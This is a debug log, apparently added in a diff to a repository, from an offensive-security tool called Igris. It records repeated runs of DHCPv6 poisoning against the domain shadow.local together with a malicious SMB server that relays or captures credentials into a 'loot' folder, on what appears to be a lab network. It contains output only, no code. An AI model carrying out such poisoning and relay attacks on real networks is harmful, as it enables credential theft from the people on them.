+2021-12-29 11:33:18.398 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:33:18.398 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:33:50.399 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:33:50.399 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:33:50.400 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:35:04.856 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 11:38:06.375 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-12-29 11:38:06.378 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 11:38:06.385 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 11:38:06.402 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local
+2021-12-29 11:38:06.404 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 11:38:06.417 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 11:38:06.423 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 11:38:06.425 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 11:38:26.820 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:38:26.821 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:38:26.822 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:38:27.825 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:38:27.826 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:38:28.446 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:38:28.447 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:38:29.491 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:38:29.491 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:38:30.483 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:38:30.484 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:38:32.483 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:38:32.484 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:38:36.489 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:38:36.491 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:38:36.493 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:38:44.505 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:38:44.506 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:39:00.519 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:39:00.519 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:39:00.528 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:39:06.728 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 11:44:28.437 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 11:44:28.439 | INFO     | project.igris:show_settable_variables_necessary:215 - Showing necessary settable variables
+2021-12-29 11:44:48.385 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 11:44:48.386 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 11:44:48.391 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 11:44:48.405 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local
+2021-12-29 11:44:48.407 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 11:44:48.414 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 11:44:48.418 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 11:44:48.421 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 11:45:05.773 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:05.775 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:05.777 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:45:06.775 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:06.775 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:08.798 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:08.798 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:08.799 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:45:09.255 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:09.255 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:10.277 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:10.277 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:11.271 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:11.271 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:13.272 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:13.273 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:17.274 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:17.275 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:25.274 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:45:25.275 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:45:25.276 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:45:28.580 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 11:47:47.994 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 11:47:47.998 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 11:47:48.007 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 11:47:48.026 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local
+2021-12-29 11:47:48.028 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 11:47:48.039 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 11:47:48.044 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 11:47:48.051 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 11:50:13.688 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 11:58:45.434 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 11:58:45.434 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 11:58:45.437 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 11:58:45.443 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:155 - Starting dhcp6 poisoning to attack shadow.local
+2021-12-29 11:58:45.443 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 11:58:45.451 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 11:58:45.453 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 11:58:45.454 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 11:59:12.004 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:59:12.004 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:59:12.005 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:59:12.997 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:59:12.997 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:59:13.815 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:59:13.815 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:59:14.844 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:59:14.844 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:59:16.846 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:59:16.847 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:59:16.847 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 11:59:17.861 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:59:17.861 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:59:19.865 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:59:19.866 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:59:23.873 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Packet crafted: 
+2021-12-29 11:59:23.875 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 11:59:26.276 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 12:07:24.021 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 12:07:24.022 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 12:07:24.029 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 12:07:24.042 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local
+2021-12-29 12:07:24.043 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 12:07:24.051 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 12:07:24.053 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 12:07:24.054 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 12:07:41.133 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:07:41.134 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:07:41.134 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:07:42.139 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:07:42.139 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:07:42.638 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:07:42.639 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:07:43.677 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:07:43.677 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:07:45.663 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:07:45.663 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:07:45.664 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:07:49.687 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:07:49.688 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:07:57.703 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:07:57.704 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:07:57.707 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:08:13.719 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:08:13.720 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:08:13.723 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:08:22.900 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-29 12:08:41.025 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-29 12:08:41.026 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-29 12:08:41.029 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-29 12:08:41.035 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:153 - Starting dhcp6 poisoning to attack shadow.local
+2021-12-29 12:08:41.035 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-29 12:08:41.038 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-29 12:08:41.039 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-29 12:08:41.039 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-29 12:08:56.488 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-29 12:08:56.489 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-29 12:08:56.497 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:109 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-29 12:08:57.475 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
